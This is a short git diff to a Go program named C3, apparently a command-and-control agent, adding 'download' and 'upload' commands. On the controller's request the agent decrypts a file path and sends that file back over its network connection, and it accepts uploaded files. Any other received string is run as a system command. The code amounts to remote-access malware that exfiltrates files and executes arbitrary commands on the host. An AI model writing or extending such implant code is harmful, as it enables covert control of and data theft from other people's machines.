@@ -10,6 +10,7 @@ import (
 
 	// C3
 	"github.com/calebmatsick/C3/pkg/security"
+	"github.com/calebmatsick/C3/pkg/transfer"
 )
 
 
@@ -37,6 +38,15 @@ func main() {
 		case cmd == "sysinfo":
 			osType := runtime.GOOS
 			enc.Encode(osType)
+		case cmd == "download":
+			encFilePath := []byte("")
+
+			dec.Decode(&encFilePath)
+			filePath := security.Decrypt(encFilePath)
+
+			transfer.SendFile(conn, filePath)
+		case cmd == "upload":
+			transfer.RecieveFile(conn)
 		default:
 			cmdSlice := []string{cmd}
 			out, err := exec.Command(cmdSlice[0], cmdSlice[1:]).Output()
